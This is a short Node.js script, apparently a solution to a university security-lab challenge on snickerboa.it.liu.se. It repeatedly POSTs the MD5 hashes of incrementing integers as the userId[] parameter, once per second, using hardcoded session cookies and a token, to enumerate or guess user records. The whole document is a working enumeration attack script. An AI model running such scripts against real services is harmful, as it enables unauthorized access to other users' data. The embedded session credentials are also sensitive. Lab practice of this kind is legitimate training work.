const https = require("https")
const MD5 = require("MD5")



var options = {
    host: 'snickerboa.it.liu.se',
    path: '/challenges/vc9b78627df2c032ceaf7375df1d847e47ed7abac2a4ce4cb6086646e0f313a4',
    //This is what changes the request to a POST request
    method: 'POST',
    headers: {
        "Cookie": 'cc_cookie={"level":["necessary","analytics","vimeo"],"revision":0,"data":null,"rfc_cookie":false}; JSESSIONID=5D6FA7DCB04110DA6ED09DBEEDC596A8; token=41202885328973844644112497934379529524',
        "Referer": "https://snickerboa.it.liu.se/challenges/1f0935baec6ba69d79cfb2eba5fdfa6ac5d77fadee08585eb98b130ec524d00c.jsp",
        "Origin": "https://snickerboa.it.liu.se",
        "Content-Type": "application/x-www-form-urlencoded"

    }
}

var index = 0;

const HackMd5 = () => {
    var req = https.request(options, (response) => {
        var str = ''
        response.on('data', function (chunk) {
            str += chunk;
        });

        response.on('end', function () {
            console.log(str);
            setTimeout(() => {
                HackMd5();
                
            }, 1000);

            
        });
    });


    //This is the data we are posting, it needs to be a string or a buffer
    req.write(`userId%5B%5D=${require('crypto').createHash('md5').update((index++).toString()).digest("hex")}`);
    // req.write(`userId%5B%5D=eccbc87e4b5ce2fe28308fd9f2a7baf3`);
    req.end();

}

module.exports = HackMd5;